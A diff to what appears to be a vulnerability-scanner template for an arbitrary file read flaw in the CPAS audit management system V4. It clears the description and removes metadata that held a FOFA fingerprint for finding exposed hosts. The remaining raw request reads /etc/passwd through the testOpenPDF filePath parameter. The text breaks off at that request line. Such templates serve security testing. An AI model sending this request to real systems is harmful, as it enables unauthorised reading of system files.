@@ -3,12 +3,8 @@ info:
   name: 友数聚CPAS审计管理系统V4 testOpenPDF 存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tg7touba7fouipvl'
+  description: ''
   tags: lfi,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: tg7touba7fouipvl
-    fofa: body="/cpasm4/static/cap/font/iconfont.css"
 http:
 - raw:
   - 'GET /cpasm4/iWebPdf/testOpenPDF?filePath=/etc/passwd HTTP/1.1
